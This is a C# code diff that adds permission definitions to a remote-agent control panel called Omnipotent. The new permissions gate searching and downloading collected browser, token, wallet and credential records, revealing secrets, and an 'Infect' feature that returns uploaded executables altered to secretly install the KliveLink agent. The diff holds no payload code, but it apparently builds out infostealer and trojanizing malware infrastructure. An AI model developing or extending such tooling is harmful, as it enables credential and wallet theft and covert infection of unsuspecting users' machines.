@@ -22,5 +22,33 @@ namespace Omnipotent.Profiles.Permissions
 
         public static readonly PermissionDef AgentsDestroy = G.Define("agents.destroy", "Control", PermissionTier.Critical,
             "Uninstall agents", "Tell a remote agent to remove itself.", ProfileRank.Klives, implies: new[] { "agents.view" });
+
+        public static readonly PermissionDef AgentsPurge = G.Define("agents.purge", "Control", PermissionTier.Critical,
+            "Remove agents from Omnipotent", "Delete an agent and all of its commands, collection data and metadata from the server.",
+            ProfileRank.Klives, implies: new[] { "agents.view", "agents.destroy" }, sensitive: true);
+
+        public static readonly PermissionDef CollectionView = G.Define("collection.view", "Collection", PermissionTier.Glance,
+            "View collection summaries", "See snapshot status, coverage and category counts for an agent.",
+            ProfileRank.Klives, implies: new[] { "agents.view" }, sensitive: true);
+
+        public static readonly PermissionDef CollectionSearch = G.Define("collection.search", "Collection", PermissionTier.Read,
+            "Search collection records", "Search collected browser, token, wallet and credential records.",
+            ProfileRank.Klives, implies: new[] { "collection.view" }, sensitive: true);
+
+        public static readonly PermissionDef CollectionDownload = G.Define("collection.download", "Collection", PermissionTier.Manage,
+            "Download collection data", "Reveal secrets and download encrypted collection bundles.",
+            ProfileRank.Klives, implies: new[] { "collection.search" }, sensitive: true);
+
+        public static readonly PermissionDef CollectionManage = G.Define("collection.manage", "Collection", PermissionTier.Critical,
+            "Manage collection", "Start a collection, change its profile, or delete a snapshot.",
+            ProfileRank.Klives, implies: new[] { "collection.download" }, sensitive: true);
+
+        public static readonly PermissionDef AuditView = G.Define("audit.view", "Audit", PermissionTier.Read,
+            "View command audit", "Read the immutable command and purge audit trail.",
+            ProfileRank.Klives, implies: new[] { "agents.view" }, sensitive: true);
+
+        public static readonly PermissionDef Infect = G.Define("infect", "Infect", PermissionTier.Critical,
+            "Infect executables", "Upload an EXE and receive a copy that also installs KliveLink when run.",
+            ProfileRank.Klives, implies: new[] { "agents.control" }, sensitive: true);
     }
 }
